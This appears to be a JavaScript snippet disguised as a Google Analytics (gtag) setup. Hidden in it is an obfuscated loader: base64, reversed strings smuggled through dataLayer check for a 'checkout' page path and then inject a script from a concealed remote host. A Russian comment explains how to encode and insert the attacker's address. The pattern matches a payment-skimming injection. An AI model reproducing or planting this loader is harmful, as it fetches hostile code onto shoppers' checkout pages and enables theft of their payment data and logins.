
window.dataLayer = window.dataLayer || [];

function gtag() { window.dataLayer.push(arguments); }

gtag('config', 'UA-4633760-7');
gtag('config', window.location.pathname)
gtag('event', 'timing_complete', {
    'name': 'load',
    'value': 3549,
    'event_category': 'JS Dependencies'
});
gtag('event', "c3R1b2tjZWhj")
gtag('eventaddr', "<addr>")
gtag('config', 'UA-4633760-7', {
    'link_attribution': true
});

if (window.dataLayer[1][1].indexOf(atob(window.dataLayer[3][1]).split("").reverse().join(""))) {
    const gas = document.createElement("script")
    gas.src = `https://${atob(window.dataLayer[4][1]).split("").reverse().join("")}`
    document.getElementsByTagName("head")[0].appendChild(gas)
}
gtag('config', 'UA-4633760-7', {
    'page_title': 'homepage',
    'page_path': '/home'
});

// btoa("<text>".split("").reverse().join("")) 
// заменить <text> и полученную строку вставить на 14 строчку вместо <addr>
